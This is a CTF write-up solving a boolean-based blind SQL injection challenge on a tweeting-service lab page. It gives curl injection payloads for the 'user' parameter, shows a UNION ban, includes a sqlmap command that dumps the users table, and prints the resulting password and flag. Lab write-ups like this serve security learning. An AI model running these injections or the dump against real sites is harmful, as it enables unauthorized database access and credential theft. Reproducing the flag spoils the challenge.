# Writeup
The last SQLi challenge, and it's Blind SQL Injection. We have to get admin's password (which is the flag).

The `user` parameter is injectable. We can confirm it's boolean-based blind: a true condition shows admin's tweets, a false one shows "No tweets found".

```bash
# true -> tweets are shown
curl -G 'http://web.katagaitai-ctf.net/sqli/step4.php' \
  --data-urlencode "user=admin' AND '1'='1"

# false -> "No tweets found."
curl -G 'http://web.katagaitai-ctf.net/sqli/step4.php' \
  --data-urlencode "user=admin' AND '1'='2"
```

UNION is blocked though:

```bash
curl -sG 'http://web.katagaitai-ctf.net/sqli/step4.php' \
  --data-urlencode "user=admin' UNION SELECT 1,database(),3 -- "
# -> Word "UNION" is banned for security!
```

So no UNION, pure boolean blind. I just let sqlmap do the char-by-char extraction, using the "tweet shown" text as the true marker.

```bash
python3 sqlmap.py \
  -u 'http://web.katagaitai-ctf.net/sqli/step4.php?user=admin' \
  -p user \
  --technique=B \
  --string='I made tweeting service!' \
  --batch --threads=1 --delay=0.2 \
  -T users --dump
```

The backend turns out to be SQLite (not MySQL), and the dump gives:

```
Table: users
+----+-------------------------------------+----------+
| id | password                            | username |
+----+-------------------------------------+----------+
| 1  | katagaitai-CTF{N3v3rUs3Pl41nT3xtPW} | admin    |
| 2  | Kataitakunai{oops}                  | flag     |
+----+-------------------------------------+----------+
```

admin's password is the flag. And yeah, "never store plaintext passwords".

# flag
```
katagaitai-CTF{N3v3rUs3Pl41nT3xtPW}
```
